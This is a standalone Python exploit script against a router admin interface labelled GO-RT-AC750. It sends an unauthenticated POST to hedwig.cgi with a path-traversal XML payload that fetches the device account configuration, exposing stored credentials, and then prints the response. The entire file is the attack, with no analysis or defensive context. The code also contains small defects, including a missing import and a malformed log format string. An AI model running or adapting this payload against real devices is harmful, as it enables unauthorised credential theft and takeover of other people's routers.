# -*- coding: utf-8 -*-
import argparse
import logging
import sys
import requests

# Set logging level for requests
logging.getLogger("requests").setLevel(logging.ERROR)

def run(host, port):
    # Construct the URL
    url = "http://{}:{}/hedwig.cgi".format(host, port)
    headers = {
        'Content-Type': 'text/xml',
        'Cookie': 'uid=123'
    }
    # XML data to be sent in the request
    data = '''<?xml version="1.0" encoding="utf-8"?><postxml>
    <module>
    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
    </module>
    </postxml>'''
    print(data)
    req = requests.post(url, headers=headers, data=data)
    if req.status_code == 200:
        logging.info("Command executed successfully!")
        logging.info("Response: %s", req.text)
    else:
        logging.error("Unknown error: %s -> %s", req.status_code, req.text)

def main():
    # Configure logging
    logging.basicConfig(stream=sys.stderr, format="%(asctime)s [%(levelname)s] % (message)s", level=logging.INFO)
    
    # Argument parser setup
    parser = argparse.ArgumentParser(description='GO-RT-AC750', formatter_class=RawTextHelpFormatter)
    parser.add_argument('--rhost', required=True, default='192.168.0.1', help="Remote target IP")
    parser.add_argument('--rport', type=int, default=80, help="Remote target port")
    result = parser.parse_args()

    # Extract and log remote host and port
    rhost = result.rhost
    logging.info("Remote Target IP: %s", rhost)
    rport = result.rport
    logging.info("Remote Target Port: %d", rport)

    # Run the main function
    run(rhost, rport)

if __name__ == '__main__':
    main()
